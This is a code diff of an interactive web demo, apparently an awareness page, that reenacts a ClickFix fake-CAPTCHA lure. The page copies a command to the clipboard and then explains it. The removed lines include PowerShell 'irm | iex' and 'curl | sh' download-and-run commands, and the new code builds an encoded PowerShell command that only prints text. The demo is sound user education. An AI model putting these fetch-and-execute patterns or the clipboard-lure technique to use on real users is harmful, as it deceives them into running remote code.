@@ -1,313 +1,464 @@
-<div class="simulator" data-simulator>
-  <div class="simulator-topline">
-    <span><i aria-hidden="true"></i> Demo</span>
-    <span><b data-detected-os>Windows</b> · Harmless script · View the source first</span>
-  </div>
+---
+// A safe, in-page reenactment of a ClickFix lure.
+// The only side effect is writing a harmless command to the clipboard after a click.
+// That command contacts no server: it only prints a message.
+---
 
-  <div class="simulator-body">
-    <ol class="progress" aria-label="Simulation progress">
-      <li class="is-active" data-progress="1"><span class="progress-marker">1</span><span class="progress-label">Lure</span></li>
-      <li data-progress="2"><span class="progress-marker">2</span><span class="progress-label">Instructions</span></li>
-      <li data-progress="3"><span class="progress-marker">3</span><span class="progress-label">Command</span></li>
-      <li data-progress="4"><span class="progress-marker">4</span><span class="progress-label">Result</span></li>
-    </ol>
-
-    <div class="demo-workspace">
-      <section class="stage" aria-live="polite">
-        <div class="browser-chrome" aria-hidden="true" data-browser-chrome>
-          <div class="chrome-dots"><span></span><span></span><span></span></div>
-          <div class="address-bar" data-address>secure-check.example</div>
-        </div>
-        <div class="terminal-chrome" aria-hidden="true" data-terminal-chrome hidden>
-          <div class="chrome-dots"><span></span><span></span><span></span></div>
-          <span data-terminal-title>Terminal</span>
+<div class="demo" data-demo data-step="1">
+  <div class="demo-grid">
+    <div class="stage">
+      <div class="fake-browser" aria-label="A fake website, part of the demo" role="group">
+        <div class="fake-bar">
+          <span class="fake-url">https://verify-human-check.example</span>
+          <span class="fake-flag">Fake site</span>
         </div>
 
-        <div class="stage-screen" data-stage-screen>
-          <div class="screen-copy" data-screen-copy>
-            <span class="screen-kicker" data-kicker>Security check</span>
-            <h3 data-title>Let’s confirm you’re human.</h3>
-            <p data-description>This quick check helps protect the site from automated traffic.</p>
-          </div>
-
-          <div class="lure-panel" data-lure>
-            <button class="captcha-box" type="button" data-trigger>
-              <span class="checkbox" aria-hidden="true"></span>
-              <span>I’m not a robot</span>
-              <span class="verify-mark" aria-hidden="true">◒<small>VERIFY</small></span>
+        <div class="fake-page">
+          <div class="fake-panel" data-panel="check">
+            <p class="fake-title">Checking that you’re human</p>
+            <p class="fake-sub">This site needs to confirm you’re not a robot before you continue.</p>
+            <button class="fake-check" type="button" data-check>
+              <span class="fake-box" aria-hidden="true"></span>
+              I’m not a robot
             </button>
           </div>
 
-          <div class="instruction-panel" data-instructions hidden>
-            <div class="panel-heading"><span>!</span><strong data-instruction-title>Additional verification required</strong></div>
-            <ol>
-              <li><span>1</span><p data-instruction="0">Press Windows + R</p></li>
-              <li><span>2</span><p data-instruction="1">Press Ctrl + V</p></li>
-              <li><span>3</span><p data-instruction="2">Press Enter</p></li>
-            </ol>
-            <button class="fake-copy-button" type="button" data-reveal>Copy verification code</button>
-            <p class="microcopy" data-microcopy>The page claims a verification code is ready.</p>
-          </div>
-
-          <div class="command-panel" data-command hidden>
-            <div class="command-label"><span data-copy-status>Harmless demo command</span><span data-tool-label>Windows Run</span></div>
-            <div class="code-shell" aria-label="Demo command">
-              <code data-command-code>powershell -NoProfile -Command "irm 'https://www.clickfix.fyi/static/example.ps1' | iex"</code>
+          <div class="fake-panel" data-panel="instructions" hidden>
+            <p class="fake-title">One more step</p>
+            <p class="fake-sub">Copy your verification code, then:</p>
+            <div class="fake-code">
+              <code>HUMAN-4821</code>
+              <button class="fake-copy" type="button" data-copy>Copy</button>
             </div>
-            <p class="source-link">This downloads and runs the script. <a href="https://www.clickfix.fyi/static/example.ps1" target="_blank" rel="noopener noreferrer" data-script-link>Read it first</a>.</p>
-            <button class="continue-button" type="button" data-consequence>What the script does <span aria-hidden="true">→</span></button>
-          </div>
-
-          <div class="terminal-panel" data-consequence-panel hidden>
-            <div class="terminal-command"><span data-terminal-prompt>$</span><code data-terminal-command></code></div>
-            <pre class="terminal-output">ClickFix demo: the downloaded script is harmless.
-No files changed. No data collected.</pre>
-            <div class="terminal-exit">Process exited with status 0</div>
-            <a href="/#already-ran-it">If you ran a real command, follow these steps</a>
+            <ol class="fake-steps">
+              <li>Press <kbd>Win</kbd> + <kbd>X</kbd>, then <kbd>I</kbd></li>
+              <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
+              <li>Press <kbd>Enter</kbd></li>
+            </ol>
           </div>
         </div>
-      </section>
+      </div>
 
-      <aside class="explanation" aria-live="polite">
-        <div class="explanation-heading"><span data-note-step>01</span><strong data-note-title>Fake CAPTCHA</strong></div>
-        <p data-note-copy>The page looks like a normal verification check.</p>
+      <div class="practice" data-practice hidden>
+        <p class="practice-label">Paste here, not in your real terminal. Nothing here can run.</p>
 
-        <div class="annotations" data-annotations hidden>
-          <div><span>A</span><p><strong data-annotation-title="0">Trusted system tool</strong><small data-annotation-copy="0">PowerShell is legitimate; the supplied command is not.</small></p></div>
-          <div><span>B</span><p><strong data-annotation-title="1">Hidden activity</strong><small data-annotation-copy="1">The window can be hidden while the command runs.</small></p></div>
-          <div><span>C</span><p><strong data-annotation-title="2">Second-stage payload</strong><small data-annotation-copy="2">The command can retrieve and launch other code.</small></p></div>
+        <div class="term">
+          <p class="term-title" aria-hidden="true">Windows PowerShell</p>
+          <label class="term-body">
+            <span class="term-prompt" aria-hidden="true">PS C:\Users\you&gt;</span>
+            <textarea rows="3" spellcheck="false" autocomplete="off" data-paste aria-label="Practice terminal"></textarea>
+          </label>
         </div>
 
-        <button class="reset-button" type="button" data-reset>Reset demo</button>
-      </aside>
+        <button class="plain-button" type="button" data-fill hidden>Copy was blocked. Fill it in for me.</button>
+      </div>
+
+      <div class="reveal" data-reveal hidden aria-live="polite">
+        <p class="reveal-label">What you actually copied:</p>
+        <p class="clip" data-clip></p>
+        <p class="reveal-label">Decoded, it says:</p>
+        <p class="clip decoded" data-decoded></p>
+        <p class="mismatch" data-mismatch hidden>That’s not what the demo copied; your clipboard held something else. Above is what it copied.</p>
+      </div>
+    </div>
+
+    <div class="notes" aria-live="polite">
+      <h3 data-note-title>The lure</h3>
+      <div data-note-body></div>
+      <button class="plain-button reset" type="button" data-reset hidden>Start the demo again</button>
     </div>
   </div>
 </div>
 
 <script>
-  const root = document.querySelector<HTMLElement>("[data-simulator]");
+  type Step = 1 | 2 | 3 | 4;
+
+  const DECODED = "Write-Host 'clickfix.fyi: a web page just got you to run this. This one only prints text.'";
+  // PowerShell's -EncodedCommand takes Base64 of UTF-16LE text, the same obfuscation real lures use.
+  const ENCODED = btoa(Array.from(DECODED, (ch) => ch + "\0").join(""));
+  const PROGRAM = "powershell -e ";
+  const CLIPBOARD = PROGRAM + ENCODED;
+
+  const notes: Record<Step, [string, string]> = {
+    1: ["The lure", "<p>A fake check, like the ones planted on hacked sites. Click it.</p>"],
+    2: ["The ask", "<p>The check “fails” and asks you to copy a code. Click Copy.</p>"],
+    3: ["The switch", "<p>You didn’t copy <code>HUMAN-4821</code>. You copied a command. Paste it below to see.</p>"],
+    4: [
+      "The disguise",
+      "<p>The command is scrambled so you can’t tell what it does. <kbd>Enter</kbd> would run it.</p><p>This one only prints a message. A real one downloads malware.</p>",
+    ],
+  };
+
+  const root = document.querySelector<HTMLElement>("[data-demo]");
 
   if (root) {
-    const platforms = {
-      windows: {
-        label: "Windows detected",
-        instructions: ["Press Windows + R", "Paste with Ctrl + V", "Press Enter"],
-        tool: "Windows Run / PowerShell",
-        command: `powershell -NoProfile -Command "irm 'https://www.clickfix.fyi/static/example.ps1' | iex"`,
-        scriptUrl: "https://www.clickfix.fyi/static/example.ps1",
-        annotations: [
-          ["Trusted system tool", "PowerShell is legitimate; the supplied command controls what it does."],
-          ["Remote retrieval", "irm downloads the hosted script into memory."],
-          ["Immediate execution", "iex runs the downloaded text as PowerShell code."],
-        ],
-        commandNote: "The button copied a PowerShell command that downloads and runs this site’s harmless script.",
-        terminalTitle: "Windows PowerShell",
-        terminalPrompt: "PS C:\\Users\\you>",
-      },
-      macos: {
-        label: "macOS detected",
-        instructions: ["Open Terminal", "Paste with Command + V", "Press Return"],
-        tool: "macOS Terminal / shell",
-        command: "curl -fsSL https://www.clickfix.fyi/static/example.sh | sh",
-        scriptUrl: "https://www.clickfix.fyi/static/example.sh",
-        annotations: [
-          ["Trusted system tool", "Terminal and the shell are legitimate; the supplied command controls what they do."],
-          ["Remote retrieval", "curl downloads the hosted script and writes it to standard output."],
-          ["Immediate execution", "The pipe sends the downloaded text directly to sh."],
-        ],
-        commandNote: "The button copied a shell command that downloads and runs this site’s harmless script.",
-        terminalTitle: "Terminal — zsh",
-        terminalPrompt: "$",
-      },
-      linux: {
-        label: "Linux detected",
-        instructions: ["Open a terminal", "Paste with Ctrl + Shift + V", "Press Enter"],
-        tool: "Linux terminal / shell",
-        command: "curl -fsSL https://www.clickfix.fyi/static/example.sh | sh",
-        scriptUrl: "https://www.clickfix.fyi/static/example.sh",
-        annotations: [
-          ["Trusted system tool", "The terminal and shell are legitimate; the supplied command controls what they do."],
-          ["Remote retrieval", "curl downloads the hosted script and writes it to standard output."],
-          ["Immediate execution", "The pipe sends the downloaded text directly to sh."],
-        ],
-        commandNote: "The button copied a shell command that downloads and runs this site’s harmless script.",
-        terminalTitle: "Terminal — bash",
-        terminalPrompt: "$",
-      },
-    } as const;
+    const $ = <T extends Element = HTMLElement>(s: string) => root.querySelector<T>(s)!;
+    const input = $<HTMLTextAreaElement>("[data-paste]");
+    let copied = false;
 
-    type Platform = keyof typeof platforms;
-    const browserNavigator = navigator as Navigator & { userAgentData?: { platform?: string } };
-    const platformHint = `${browserNavigator.userAgentData?.platform ?? ""} ${navigator.platform ?? ""} ${navigator.userAgent}`.toLowerCase();
-    const selectedPlatform: Platform = platformHint.includes("mac") || platformHint.includes("iphone") || platformHint.includes("ipad")
-      ? "macos"
-      : platformHint.includes("win")
-        ? "windows"
-        : "linux";
-    const platform = platforms[selectedPlatform];
-
-    const get = <T extends Element>(selector: string) => root.querySelector<T>(selector)!;
-    const all = <T extends Element>(selector: string) => root.querySelectorAll<T>(selector);
-    const panels = {
-      instructions: get<HTMLElement>("[data-instructions]"),
-      command: get<HTMLElement>("[data-command]"),
-      consequence: get<HTMLElement>("[data-consequence-panel]"),
-    };
-
-    function setStep(step: 1 | 2 | 3 | 4) {
-      root.dataset.step = String(step);
-      all<HTMLElement>("[data-progress]").forEach((item) => {
-        const itemStep = Number(item.dataset.progress);
-        item.classList.toggle("is-active", itemStep === step);
-        item.classList.toggle("is-done", itemStep < step);
-      });
-
-      get<HTMLElement>("[data-lure]").hidden = step !== 1;
-      panels.instructions.hidden = step !== 2;
-      panels.command.hidden = step !== 3;
-      panels.consequence.hidden = step !== 4;
-      get<HTMLElement>("[data-screen-copy]").hidden = step >= 3;
-      get<HTMLElement>("[data-annotations]").hidden = step !== 3;
-      get<HTMLElement>("[data-browser-chrome]").hidden = step === 4;
-      get<HTMLElement>("[data-terminal-chrome]").hidden = step !== 4;
-
-      const notes = [
-        ["Fake CAPTCHA", "The page looks like a normal verification check."],
-        ["Instructions", "A CAPTCHA should never ask you to open a system tool or paste a command."],
-        ["Copied command", platform.commandNote],
-        ["Terminal output", "The command ran in the local terminal. This demo script only prints text; a real payload could do anything allowed by the user account."],
-      ];
-      const note = notes[step - 1];
-      get<HTMLElement>("[data-note-step]").textContent = `0${step}`;
-      get<HTMLElement>("[data-note-title]").textContent = note[0];
-      get<HTMLElement>("[data-note-copy]").textContent = note[1];
+    function setStep(step: Step) {
+      root!.dataset.step = String(step);
+      $("[data-panel=check]").hidden = step !== 1;
+      $("[data-panel=instructions]").hidden = step === 1;
+      $("[data-practice]").hidden = step < 3;
+      $("[data-reveal]").hidden = step !== 4;
+      $("[data-reset]").hidden = step === 1;
+      $("[data-fill]").hidden = !(step === 3 && !copied);
+      $("[data-copy]").textContent = step >= 3 ? "Copied" : "Copy";
+      $("[data-note-title]").textContent = notes[step][0];
+      $("[data-note-body]").innerHTML = notes[step][1];
     }
 
-    get<HTMLElement>("[data-detected-os]").textContent = platform.label;
-    all<HTMLElement>("[data-instruction]").forEach((item, index) => item.textContent = platform.instructions[index]);
-    get<HTMLElement>("[data-tool-label]").textContent = platform.tool;
-    get<HTMLElement>("[data-command-code]").textContent = platform.command;
-    get<HTMLElement>("[data-terminal-command]").textContent = platform.command;
-    get<HTMLElement>("[data-terminal-title]").textContent = platform.terminalTitle;
-    get<HTMLElement>("[data-terminal-prompt]").textContent = platform.terminalPrompt;
-    get<HTMLAnchorElement>("[data-script-link]").href = platform.scriptUrl;
-    all<HTMLElement>("[data-annotation-title]").forEach((item, index) => item.textContent = platform.annotations[index][0]);
-    all<HTMLElement>("[data-annotation-copy]").forEach((item, index) => item.textContent = platform.annotations[index][1]);
+    function reset() {
+      copied = false;
+      input.value = "";
+      setStep(1);
+    }
 
-    get<HTMLButtonElement>("[data-trigger]").addEventListener("click", () => setStep(2));
-    get<HTMLButtonElement>("[data-reveal]").addEventListener("click", async () => {
-      const status = get<HTMLElement>("[data-copy-status]");
+    function showPasted(pasted: string | null) {
+      const clip = $("[data-clip]");
+      const program = document.createElement("span");
+      program.className = "part-cmd";
+      program.textContent = PROGRAM;
+      const blob = document.createElement("span");
+      blob.className = "part-blob";
+      blob.textContent = ENCODED;
+      clip.replaceChildren(program, blob);
+      $("[data-decoded]").textContent = DECODED;
+      $("[data-mismatch]").hidden = pasted === null || pasted.trim() === CLIPBOARD;
+      setStep(4);
+    }
+
+    $("[data-check]").addEventListener("click", () => setStep(2));
+
+    $("[data-copy]").addEventListener("click", async () => {
       try {
-        await navigator.clipboard.writeText(platform.command);
-        status.textContent = "Copied to clipboard";
+        await navigator.clipboard.writeText(CLIPBOARD);
+        copied = true;
       } catch {
-        status.textContent = "Copy blocked — select manually";
+        copied = false;
       }
       setStep(3);
     });
-    get<HTMLButtonElement>("[data-consequence]").addEventListener("click", () => setStep(4));
-    get<HTMLButtonElement>("[data-reset]").addEventListener("click", () => {
-      get<HTMLElement>("[data-copy-status]").textContent = "Harmless demo command";
-      setStep(1);
+
+    input.addEventListener("paste", (event) => showPasted(event.clipboardData?.getData("text") ?? null));
+    input.addEventListener("keydown", (event) => {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        if (input.value) showPasted(input.value);
+      }
     });
+
+    $("[data-fill]").addEventListener("click", () => {
+      input.value = CLIPBOARD;
+      input.focus();
+      showPasted(null);
+    });
+
+    $("[data-reset]").addEventListener("click", reset);
     setStep(1);
   }
 </script>
 
 <style>
-  .simulator { margin-top: 0; overflow: hidden; border: 1px solid var(--line); border-radius: 4px; background: var(--surface); }
-  .simulator-topline { min-height: 40px; display: flex; justify-content: space-between; align-items: center; gap: 1rem; border-bottom: 1px solid var(--line); padding: 0.65rem 0.9rem; background: var(--paper-deep); color: var(--ink-soft); font-size: 0.7rem; font-weight: 700; }
-  .simulator-topline span:first-child { display: flex; align-items: center; gap: 0.45rem; }
-  .simulator-topline b { color: var(--ink); }
-  .simulator-topline i { width: 8px; height: 8px; border-radius: 50%; background: var(--safe); }
-  .simulator-body { padding: clamp(0.9rem, 2.5vw, 1.5rem); }
-
-  .progress { display: grid; grid-template-columns: repeat(4, 1fr); margin: 0 0 1.15rem; padding: 0; list-style: none; }
-  .progress li { position: relative; display: grid; grid-template-rows: 26px auto; gap: 0.4rem; justify-items: start; color: #7b858b; font-size: 0.7rem; font-weight: 700; }
-  .progress li::after { position: absolute; z-index: 0; top: 13px; right: 0; left: 26px; height: 1px; background: var(--line); content: ""; }
-  .progress li:last-child::after { display: none; }
-  .progress-marker { position: relative; z-index: 1; width: 26px; height: 26px; display: grid; place-items: center; border: 1px solid var(--line); border-radius: 50%; background: var(--surface); font-family: var(--font-mono); font-size: 0.62rem; }
-  .progress-label { grid-row: 2; }
-  .progress li.is-active { color: var(--ink); }
-  .progress li.is-active .progress-marker { border-color: var(--signal); background: var(--signal); color: #fff; }
-  .progress li.is-done .progress-marker { border-color: var(--safe); background: var(--safe-pale); color: var(--safe); }
-
-  .demo-workspace { display: grid; grid-template-columns: minmax(0, 1fr) 230px; border: 1px solid var(--line); }
-  .stage { min-width: 0; border-right: 1px solid var(--line); background: #f4f6f7; }
-  .browser-chrome { height: 40px; display: grid; grid-template-columns: 52px 1fr 52px; align-items: center; border-bottom: 1px solid var(--line); padding-inline: 0.7rem; background: #dfe3e5; }
-  .chrome-dots { display: flex; gap: 5px; }
-  .chrome-dots span { width: 8px; height: 8px; border-radius: 50%; background: #a8afb3; }
-  .address-bar { overflow: hidden; border-radius: 3px; padding: 0.25rem 0.5rem; background: #f7f8f9; color: #687279; font-size: 0.62rem; text-align: center; text-overflow: ellipsis; white-space: nowrap; }
-  .terminal-chrome { height: 40px; display: grid; grid-template-columns: 52px 1fr 52px; align-items: center; border-bottom: 1px solid #343c42; padding-inline: 0.7rem; background: #252b30; color: #c8d0d5; font-family: var(--font-mono); font-size: 0.62rem; text-align: center; }
-  .stage-screen { min-height: 420px; display: grid; align-content: center; padding: clamp(1.2rem, 3vw, 2.2rem); background: #f5f7f8; color: #272d31; }
-  .screen-copy { text-align: center; }
-  .screen-kicker { display: block; margin-bottom: 0.35rem; color: #5e686e; font-size: 0.64rem; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; }
-  .screen-copy h3 { margin-bottom: 0.5rem; font-size: clamp(1.35rem, 3vw, 1.9rem); letter-spacing: -0.035em; }
-  .screen-copy p { max-width: 390px; margin: 0 auto; color: #677178; font-size: 0.8rem; }
-  .lure-panel, .instruction-panel, .command-panel { width: min(100%, 430px); margin: 1.35rem auto 0; }
-
-  .captcha-box { width: min(100%, 340px); min-height: 76px; display: grid; grid-template-columns: 32px 1fr 52px; gap: 0.7rem; align-items: center; margin: auto; border: 1px solid #b9c0c4; border-radius: 3px; padding: 0.75rem; background: #fff; color: #333; cursor: pointer; text-align: left; }
-  .checkbox { width: 27px; height: 27px; border: 2px solid #667078; background: #fff; }
-  .verify-mark { display: grid; justify-items: center; color: #286bd6; font-size: 1.35rem; }
-  .verify-mark small { color: #727b80; font-size: 0.42rem; }
-
-  .instruction-panel { border: 1px solid #bdc4c8; padding: 1.15rem; background: #fff; }
-  .panel-heading { display: flex; gap: 0.55rem; align-items: center; border-bottom: 1px solid #e0e4e6; padding-bottom: 0.8rem; font-size: 0.76rem; }
-  .panel-heading > span { width: 23px; height: 23px; display: grid; place-items: center; border-radius: 50%; background: var(--signal); color: #fff; font-weight: 800; }
-  .instruction-panel ol { display: grid; gap: 0.65rem; margin: 0.9rem 0; padding: 0; list-style: none; }
-  .instruction-panel li { display: grid; grid-template-columns: 23px 1fr; gap: 0.55rem; align-items: center; }
-  .instruction-panel li > span { width: 23px; height: 23px; display: grid; place-items: center; border-radius: 50%; background: #edf0f1; font-size: 0.62rem; font-weight: 800; }
-  .instruction-panel li p { margin: 0; color: #4f595f; font-size: 0.75rem; }
-  .fake-copy-button, .continue-button { width: 100%; border: 0; border-radius: 3px; padding: 0.7rem 0.9rem; background: #176bd5; color: #fff; cursor: pointer; font-size: 0.74rem; font-weight: 700; }
-  .microcopy { margin: 0.6rem 0 0; color: #737d82; font-size: 0.62rem; text-align: center; }
-
-  .command-panel { margin-top: 0; }
-  .command-label { display: flex; justify-content: space-between; gap: 1rem; margin-bottom: 0.55rem; color: #687279; font-size: 0.62rem; }
-  .command-label span:first-child { color: var(--safe); font-weight: 800; text-transform: uppercase; }
-  .code-shell { overflow-x: auto; min-height: 110px; display: flex; align-items: center; border-radius: 3px; padding: 1rem; background: #171c20; color: #e8ecee; font-size: 0.72rem; line-height: 1.65; }
-  .code-shell code { padding: 0; background: transparent; color: inherit; overflow-wrap: anywhere; }
-  .source-link { margin: 0.55rem 0 0; color: var(--ink-soft); font-size: 0.62rem; }
-  .source-link a { font-weight: 700; }
-  .continue-button { margin-top: 0.8rem; background: var(--ink); }
-  .simulator[data-step="4"] .stage-screen { align-content: start; background: #101417; color: #dce3e7; }
-  .terminal-panel { width: 100%; font-family: var(--font-mono); font-size: 0.72rem; line-height: 1.65; }
-  .terminal-command { display: grid; grid-template-columns: auto minmax(0, 1fr); gap: 0.6rem; color: #f3f6f8; }
-  .terminal-command > span { color: #76d7ad; white-space: nowrap; }
-  .terminal-command code { min-width: 0; padding: 0; background: transparent; color: inherit; overflow-wrap: anywhere; }
-  .terminal-output { margin: 1.2rem 0 0; border: 0; padding: 0; background: transparent; color: #a9e8c8; font: inherit; white-space: pre-wrap; }
-  .terminal-exit { margin: 1rem 0 1.5rem; color: #89949b; }
-  .terminal-panel a { color: #fff; font-family: var(--font-sans); font-size: 0.72rem; font-weight: 700; }
-
-  .explanation { display: flex; flex-direction: column; padding: 1.1rem; background: #eef1f3; }
-  .explanation-heading { display: flex; gap: 0.65rem; align-items: center; margin-bottom: 0.65rem; }
-  .explanation-heading > span { color: var(--signal); font-family: var(--font-mono); font-size: 0.68rem; font-weight: 800; }
-  .explanation-heading strong { font-size: 0.78rem; }
-  .explanation > p { margin: 0; color: var(--ink-soft); font-size: 0.73rem; line-height: 1.5; }
-  .annotations { display: grid; gap: 0.85rem; margin-top: 1.1rem; border-top: 1px solid var(--line); padding-top: 1rem; }
-  .annotations > div { display: grid; grid-template-columns: 24px minmax(0, 1fr); gap: 0.6rem; align-items: start; }
-  .annotations > div > span { width: 22px; height: 22px; display: grid; place-items: center; border-radius: 50%; background: var(--warning); color: var(--ink); font-size: 0.6rem; font-weight: 800; }
-  .annotations p { min-width: 0; margin: 0; }
-  .annotations strong, .annotations small { display: block; }
-  .annotations strong { color: var(--ink); font-size: 0.7rem; line-height: 1.35; }
-  .annotations small { margin-top: 0.18rem; color: var(--ink-soft); font-size: 0.65rem; line-height: 1.45; }
-  .reset-button { margin-top: auto; border: 0; padding: 1.5rem 0 0; background: transparent; color: var(--ink-soft); cursor: pointer; font-size: 0.68rem; font-weight: 700; text-align: left; text-decoration: underline; text-underline-offset: 3px; }
-
-  [hidden] { display: none !important; }
-
-  @media (max-width: 760px) {
-    .demo-workspace { grid-template-columns: 1fr; }
-    .stage { border-right: 0; border-bottom: 1px solid var(--line); }
-    .explanation { min-height: 130px; }
-    .reset-button { margin-top: 0; }
-    .annotations { grid-template-columns: repeat(3, 1fr); }
+  .demo {
+    margin-top: 2rem;
   }
 
-  @media (max-width: 560px) {
-    .simulator-topline span:last-child { display: none; }
-    .progress li { grid-template-rows: 26px; gap: 0; }
-    .progress-label { display: none; }
-    .progress li::after { right: 8px; left: 26px; }
-    .stage-screen { min-height: 440px; padding: 1rem; }
-    .annotations { grid-template-columns: 1fr; }
+  .demo-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 1.5fr) minmax(16rem, 1fr);
+    gap: clamp(1.5rem, 4vw, 3.5rem);
+    align-items: start;
+  }
+
+  /* ---------- Mock attacker UI (lure blue lives only here) ---------- */
+  .fake-browser {
+    overflow: hidden;
+    border: 1px solid #c4c9cf;
+    border-radius: 10px;
+    background: #fff;
+    box-shadow: 0 1px 0 #e3e6ea;
+    font-family: var(--ui);
+  }
+
+  .fake-bar {
+    display: flex;
+    gap: 0.75rem;
+    align-items: center;
+    border-bottom: 1px solid #dfe2e6;
+    padding: 0.55rem 0.75rem;
+    background: #eef0f3;
+  }
+
+  .fake-url {
+    flex: 1;
+    min-width: 0;
+    overflow: hidden;
+    border-radius: 999px;
+    padding: 0.3rem 0.8rem;
+    background: #fff;
+    color: #4a525c;
+    font-size: 0.8rem;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  .fake-flag {
+    flex: none;
+    border: 1px solid var(--stop);
+    border-radius: 4px;
+    padding: 0.05rem 0.4rem;
+    color: var(--stop);
+    font-size: 0.72rem;
+    font-weight: 600;
+  }
+
+  .fake-page {
+    min-height: 17rem;
+    display: grid;
+    place-items: center;
+    padding: clamp(1.25rem, 4vw, 2.5rem) 1.25rem;
+    color: #2b3138;
+  }
+
+  .fake-panel {
+    width: min(100%, 23rem);
+  }
+
+  .fake-title {
+    font-size: 1.2rem;
+    font-weight: 650;
+    line-height: 1.3;
+  }
+
+  .fake-sub {
+    margin-top: 0.35rem;
+    color: #5b636d;
+    font-size: 0.9rem;
+    line-height: 1.45;
+  }
+
+  .fake-check {
+    width: 100%;
+    display: flex;
+    gap: 0.8rem;
+    align-items: center;
+    margin-top: 1.25rem;
+    border: 1px solid #c9ced4;
+    border-radius: 6px;
+    padding: 1rem;
+    background: #f9fafb;
+    cursor: pointer;
+    font-size: 1rem;
+    text-align: left;
+  }
+
+  .fake-check:hover {
+    border-color: var(--lure);
+  }
+
+  .fake-box {
+    width: 1.6rem;
+    height: 1.6rem;
+    flex: none;
+    border: 2px solid #8b939c;
+    border-radius: 4px;
+    background: #fff;
+  }
+
+  .fake-code {
+    display: flex;
+    align-items: stretch;
+    margin-top: 1rem;
+    border: 1px solid #c9ced4;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .fake-code code {
+    flex: 1;
+    padding: 0.65rem 0.8rem;
+    background: #f9fafb;
+    font-size: 1rem;
+    letter-spacing: 0.04em;
+  }
+
+  .fake-copy {
+    border: 0;
+    padding: 0 1.1rem;
+    background: var(--lure);
+    color: #fff;
+    cursor: pointer;
+    font-family: var(--ui);
+    font-size: 0.9rem;
+    font-weight: 600;
+  }
+
+  .fake-copy:hover {
+    background: #1d4fa3;
+  }
+
+  .fake-steps {
+    display: grid;
+    gap: 0.6rem;
+    margin-top: 1rem;
+    border-left: 3px solid var(--lure);
+    padding-left: 1.75rem;
+    font-size: 0.95rem;
+    line-height: 1.6;
+  }
+
+  .fake-steps kbd {
+    font-family: var(--ui);
+  }
+
+  /* ---------- Practice box ---------- */
+  .practice {
+    margin-top: 1.5rem;
+  }
+
+  .practice-label {
+    max-width: 34rem;
+    margin-bottom: 0.75rem;
+    font-size: 1rem;
+  }
+
+  .term {
+    max-width: 36rem;
+    overflow: hidden;
+    border-radius: 8px;
+    background: #0c1a2b;
+    color: #e6e9ec;
+  }
+
+  .term-title {
+    padding: 0.4rem 0.8rem;
+    background: #1f2b3a;
+    color: #b8c2cc;
+    font: 0.78rem var(--ui);
+  }
+
+  .term-body {
+    display: block;
+    padding: 0.8rem 0.9rem;
+    font: 0.88rem/1.5 var(--mono);
+  }
+
+  .term-prompt {
+    display: block;
+    color: #e6e9ec;
+  }
+
+  .term-body textarea {
+    width: 100%;
+    border: 0;
+    padding: 0;
+    background: transparent;
+    color: inherit;
+    font: inherit;
+    field-sizing: content;
+    word-break: break-all;
+    resize: none;
+    caret-color: #e6e9ec;
+  }
+
+  .term-body textarea:focus-visible {
+    outline: 2px solid var(--focus);
+    outline-offset: 4px;
+  }
+
+  .plain-button {
+    margin-top: 0.85rem;
+    border: 0;
+    padding: 0;
+    background: none;
+    cursor: pointer;
+    font-family: var(--ui);
+    font-size: 0.95rem;
+    text-decoration: underline;
+    text-underline-offset: 0.18em;
+  }
+
+  /* ---------- Reveal ---------- */
+  .reveal {
+    margin-top: 1.75rem;
+  }
+
+  .reveal-label {
+    margin-bottom: 0.5rem;
+    font-size: 1rem;
+    font-weight: 600;
+  }
+
+  .clip {
+    border-radius: 8px;
+    padding: 1rem;
+    background: var(--wash);
+    font: 0.85rem/1.7 var(--mono);
+    overflow-wrap: anywhere;
+  }
+
+  .clip :global(.part-cmd) {
+    background: var(--stop-wash);
+    box-shadow: inset 0 -2px 0 var(--stop);
+    color: var(--stop-deep);
+  }
+
+  .clip :global(.part-blob) {
+    color: var(--muted);
+    word-break: break-all;
+  }
+
+  .decoded {
+    color: var(--ink);
+  }
+
+  .reveal .reveal-label + .decoded {
+    margin-top: 0;
+  }
+
+  .clip + .reveal-label {
+    margin-top: 1.25rem;
+  }
+
+  .mismatch {
+    margin-top: 0.75rem;
+    color: var(--stop-deep);
+    font-size: 0.95rem;
+  }
+
+  /* ---------- Notes ---------- */
+  .notes {
+    position: sticky;
+    top: 1.5rem;
+    border-top: 3px solid var(--ink);
+    padding-top: 1rem;
+  }
+
+  .notes h3 {
+    margin-bottom: 0.6rem;
+  }
+
+  .notes :global(p) {
+    font-size: 1.05rem;
+  }
+
+  .notes :global(p + p) {
+    margin-top: 0.75rem;
+  }
+
+  .reset {
+    margin-top: 1.25rem;
+  }
+
+  @media (max-width: 52rem) {
+    .demo-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .notes {
+      position: static;
+    }
   }
 </style>
